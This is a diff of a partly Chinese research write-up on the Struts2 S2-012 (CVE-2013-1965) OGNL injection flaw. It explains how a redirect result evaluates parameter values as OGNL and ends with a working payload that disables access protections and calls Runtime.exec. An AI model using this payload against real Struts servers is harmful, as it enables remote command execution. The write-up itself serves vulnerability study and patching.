@@ -2,11 +2,19 @@
 
 ## Summary
 
-Impact of vulnerability: Remote command execution
+| Who should read this    | All Struts 2 developers                                      |
+| :---------------------- | ------------------------------------------------------------ |
+| Impact of vulnerability | Remote command execution                                     |
+| Maximum security rating | Moderately Critical                                          |
+| Recommendation          | Developers should immediately upgrade to [Struts 2.3.14.3](http://struts.apache.org/download.cgi#struts23141) |
+| Affected Software       | Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2     |
+| Reporter                | Xgc Kxlzx, Alibaba Security Team                             |
+| CVE Identifier          | [CVE-2013-1965](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1965) |
+| Original Description    | Reported directly to security@a.o                            |
 
-Affected Software: `Struts Showcase App 2.0.0` - `Struts Showcase App 2.3.14.2 `
+## Problem
 
-Problem: 在`S2-003`、`S2-005`和`S2-009`中已经解决了`OGNL`表达式解析问题，但是由于它只涉及参数名的防护，没有考虑到参数值注入`OGNL`表达式。因此基于参数名白名单(`acceptableName`)和禁止方法执行(`denyMethodExecution`)的方式只能部分修复漏洞，不能完全解决。
+在`S2-003`、`S2-005`和`S2-009`中已经解决了`OGNL`表达式解析问题，但是由于它只涉及参数名的防护，没有考虑到参数值注入`OGNL`表达式。因此基于参数名白名单(`acceptableName`)和禁止方法执行(`denyMethodExecution`)的方式只能部分修复漏洞，不能完全解决。
 
 当`action`中配置`result`为`redirect`并且传递了某个参数，在触发`redirect`类型返回时，`Struts2` 获取使用`${name}` 获取其值，在这个过程中会对`name`参数的值执行` OGNL` 表达式解析，从而可以插入任意 `OGNL` 表达式导致命令执行。
 
@@ -18,19 +26,16 @@ Problem: 在`S2-003`、`S2-005`和`S2-009`中已经解决了`OGNL`表达式解�
 
 ## Environment
 
-Struts2 Version: `Struts-2.2.3`
-
-Server: `Tomcat 8.5.53`.
-
-IDE: `idea 2020.1.1 ULTIMATE`
+| Struts2 Version | struts-2.2.3           |
+| --------------- | ---------------------- |
+| Server          | Tomcat 8.5.53          |
+| IDE             | idea 2020.1.1 ULTIMATE |
 
 ## POC
 
-![20200717095816](img/20200717095816.jpg)
+<img src="img/20200717095816.jpg" alt="20200717095816" style="zoom:150%;" />
 
-## Payload
-
-无回显
+无回显payload:
 
 ```java
 %{(#context['xwork.MethodAccessor.denyMethodExecution']=false)(#_memberAccess['allowStaticMethodAccess']=true)(@java.lang.Runtime@getRuntime().exec('calc'))}
